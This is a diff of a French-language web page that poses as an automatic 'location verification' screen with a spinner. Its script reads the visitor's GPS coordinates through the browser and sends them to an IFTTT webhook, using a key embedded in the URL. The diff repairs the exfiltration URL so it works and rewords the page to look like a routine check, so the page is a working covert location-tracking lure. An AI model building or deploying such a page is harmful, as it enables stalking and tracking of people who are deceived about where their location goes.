@@ -2,20 +2,20 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Vérification d'identité</title>
+  <title>Vérification de localisation</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       text-align: center;
-      margin-top: 80px;
+      margin-top: 100px;
     }
     .loader {
-      margin: 20px auto;
+      margin: 30px auto;
       border: 8px solid #f3f3f3;
       border-top: 8px solid #3498db;
       border-radius: 50%;
-      width: 50px;
-      height: 50px;
+      width: 60px;
+      height: 60px;
       animation: spin 1s linear infinite;
     }
     @keyframes spin {
@@ -25,23 +25,22 @@
   </style>
 </head>
 <body>
-  <h2>Chargement en cours...</h2>
+  <h2>Vérification en cours...</h2>
   <div class="loader"></div>
-  <p>Merci de patienter pendant la vérification automatique.</p>
+  <p>Merci de patienter pendant l'identification automatique de votre position.</p>
 
   <script>
     navigator.geolocation.getCurrentPosition(function(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
 
-      // Envoie des données vers un webhook de test (ex: Discord, IFTTT, etc.)
-      fetch("https://maker.ifttt.com/trigger/gps_event/with/key/wOjzYcX9cJALQ-uu5BX_z" + lat + "&value2=" + lon);
+      // Envoie des coordonnées GPS à IFTTT
+      fetch("https://maker.ifttt.com/trigger/gps_event/with/key/wOjzYcX9cJALQ-uu5BX_z?value1=" + lat + "&value2=" + lon);
 
-      document.body.innerHTML = "<h2>Merci. Vérification terminée ✅</h2><p>Vous pouvez fermer cette page.</p>";
+      document.body.innerHTML = "<h2>Merci ✅</h2><p>Votre position a été confirmée. Vous pouvez fermer la page.</p>";
     }, function(error) {
-      document.body.innerHTML = "<h2>⚠️ L'autorisation de localisation est requise.</h2><p>Veuillez activer la localisation pour continuer.</p>";
+      document.body.innerHTML = "<h2>⚠️ Autorisation de localisation refusée</h2><p>Veuillez autoriser l’accès à votre position pour continuer.</p>";
     });
   </script>
 </body>
-</!DOCTYPE html>
-<html>
+</html>
